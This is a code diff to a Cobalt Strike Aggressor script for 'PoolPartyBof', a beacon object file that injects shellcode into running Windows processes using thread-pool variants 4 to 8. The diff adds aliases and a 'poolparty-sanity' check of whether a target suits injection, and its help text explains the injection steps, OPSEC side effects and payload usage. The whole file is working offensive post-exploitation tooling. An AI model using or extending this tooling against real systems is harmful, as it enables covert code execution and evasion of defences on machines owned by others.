@@ -3,12 +3,38 @@
 #   https://github.com/An0nUD4Y
 #   https://x.com/m4lici0u5
 
+sub poolparty_load_object {
+    local('$variant $handle $data');
+    $variant = $1;
+    if ($variant == 4) {
+        $handle = openf(script_resource("PoolPartyBof_V4.x64.o"));
+    }
+    else if ($variant == 5) {
+        $handle = openf(script_resource("PoolPartyBof_V5.x64.o"));
+    }
+    else if ($variant == 6) {
+        $handle = openf(script_resource("PoolPartyBof_V6.x64.o"));
+    }
+    else if ($variant == 7) {
+        $handle = openf(script_resource("PoolPartyBof_V7.x64.o"));
+    }
+    else {
+        $handle = openf(script_resource("PoolPartyBof_V8.x64.o"));
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
 beacon_command_register (
     "PoolPartyBof",
     "Thread-pool injection, variants 4-8",
     "Author: @an0nud4y\n\n" .
-    "PoolPartyBof <pid> <shellcode_file> <variant> [delay_sec] [drip [drip_ms]]\n\n" .
-    "x64 beacon and x64 target only. WOW64 targets and this beacon PID are refused.\n" .
+    "PoolPartyBof <pid> <shellcode_file> <variant> [delay_sec] [drip [drip_ms]]\n" .
+    "poolparty <pid> <shellcode_file> <variant> [delay_sec] [drip [drip_ms]]\n\n" .
+    "Injects only. Does not sanity-check the PID. A 32-bit or layout-mismatched\n" .
+    "target can crash — run poolparty-sanity first if unsure.\n\n" .
+    "x64 beacon and x64 target only. This beacon PID is refused.\n" .
     "The target must already have a Windows thread pool.\n" .
     "Shellcode is allocated RW, written, then protected RX.\n" .
     "delay_sec busy-waits between major API steps (not Sleep) and blocks Beacon\n" .
@@ -18,13 +44,12 @@ beacon_command_register (
     "  4  TP_IO       Temp file (delete-on-close) + overlapped write onto the\n" .
     "                 pool IOCP. File is closed after the write.\n" .
     "  5  TP_ALPC     Named ALPC port associated with the pool IOCP.\n" .
-    "                 Leaves a leaked anonymous ALPC port in this beacon.\n" .
     "  6  TP_JOB      Unnamed job; assigns this beacon to the job so Windows\n" .
-    "                 posts a packet. Beacon stays in the job; job handle leaks.\n" .
+    "                 posts a packet. Nested jobs may fail assign.\n" .
     "  7  TP_DIRECT   Writes a remote TP_DIRECT and posts it with ZwSetIoCompletion\n" .
     "                 on the pool IOCP. No temp file, named object, or job.\n" .
-    "  8  TP_TIMER    Worker factory + IRTimer. Replaces pool timer-queue roots.\n" .
-    "                 Can orphan existing pool timers. Does not use an IOCP.\n\n" .
+    "  8  TP_TIMER    Worker factory + IRTimer. Replaces pool timer-queue roots,\n" .
+    "                 then restores them after ~1s. Does not use an IOCP.\n\n" .
     "Optional\n" .
     "  delay_sec   Seconds between major API steps. Default 0, cap 120.\n" .
     "              Does not pace drip pages.\n" .
@@ -38,8 +63,26 @@ beacon_command_register (
     "  PoolPartyBof 2136 C:\\payloads\\sc.bin 8 drip\n"
 );
 
-alias PoolPartyBof {
-    local('$barch $handle $data $args $pid $ShellcodeFile $variant $delay $drip $drip_ms $n $sc_handle $sc_data $task');
+beacon_command_register (
+    "poolparty",
+    "Thread-pool injection, variants 4-8 (alias of PoolPartyBof)",
+    beacon_command_detail("PoolPartyBof")
+);
+
+beacon_command_register (
+    "poolparty-sanity",
+    "Query-only PoolParty suitability check (no inject)",
+    "poolparty-sanity [pid] [variant]\n\n" .
+    "Does not inject. Opens the PID and checks that this variant can run:\n" .
+    "live x64 process (not WOW64), a Windows thread pool, V4-V7 pool IOCP,\n" .
+    "V8 IRTimer and timer-queue pointers, V4 writable temp, V5 ALPC port.\n" .
+    "Prints PASS or FAIL. No shellcode, no remote memory write.\n\n" .
+    "OPSEC: handle snapshot. V4 touches %TEMP%. V5 creates a short-lived\n" .
+    "named ALPC. Then inject with: poolparty [pid] <shellcode.bin> [variant]\n"
+);
+
+sub _poolparty_inject {
+    local('$barch $data $args $pid $ShellcodeFile $variant $delay $drip $drip_ms $n $sc_handle $sc_data $task');
 
     $n = size(@_);
     if (($n < 4) || ($n > 7)) {
@@ -126,25 +169,12 @@ alias PoolPartyBof {
     $sc_data = readb($sc_handle, -1);
     closef($sc_handle);
 
-    if ($variant == 4) {
-        $handle = openf(script_resource("PoolPartyBof_V4.x64.o"));
-    }
-    else if ($variant == 5) {
-        $handle = openf(script_resource("PoolPartyBof_V5.x64.o"));
-    }
-    else if ($variant == 6) {
-        $handle = openf(script_resource("PoolPartyBof_V6.x64.o"));
-    }
-    else if ($variant == 7) {
-        $handle = openf(script_resource("PoolPartyBof_V7.x64.o"));
-    }
-    else {
-        $handle = openf(script_resource("PoolPartyBof_V8.x64.o"));
+    if ($sc_data eq "") {
+        berror($1, "Shellcode is empty");
+        return;
     }
 
-    $data = readb($handle, -1);
-    closef($handle);
-
+    $data = poolparty_load_object(int($variant));
     if ($data eq "") {
         berror($1, "Failed to load BOF object");
         return;
@@ -156,5 +186,53 @@ alias PoolPartyBof {
         $task = $task . " (drip)";
     }
     btask($1, $task);
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias PoolPartyBof {
+    invoke(&_poolparty_inject, @_);
+}
+
+alias poolparty {
+    invoke(&_poolparty_inject, @_);
+}
+
+alias poolparty-sanity {
+    local('$barch $data $args $pid $variant $n');
+
+    $n = size(@_);
+    if ($n != 3) {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("poolparty-sanity"));
+        return;
+    }
+
+    $barch = barch($1);
+    if ($barch !eq 'x64') {
+        berror($1, "Only x64 Supported");
+        return;
+    }
+
+    $pid = $2;
+    $variant = $3;
+
+    if ((!-isnumber $pid) || (int($pid) <= 0)) {
+        berror($1, "Please enter a valid PID");
+        return;
+    }
+
+    if ((!-isnumber $variant) || (int($variant) < 4) || (int($variant) > 8)) {
+        berror($1, "Variant must be 4-8");
+        return;
+    }
+
+    $data = poolparty_load_object(int($variant));
+    if ($data eq "") {
+        berror($1, "Failed to load BOF object");
+        return;
+    }
+
+    $args = bof_pack($1, "i", int($pid));
+    btask($1, "PoolParty sanity check PID $pid variant $variant");
     beacon_inline_execute($1, $data, "go", $args);
 }
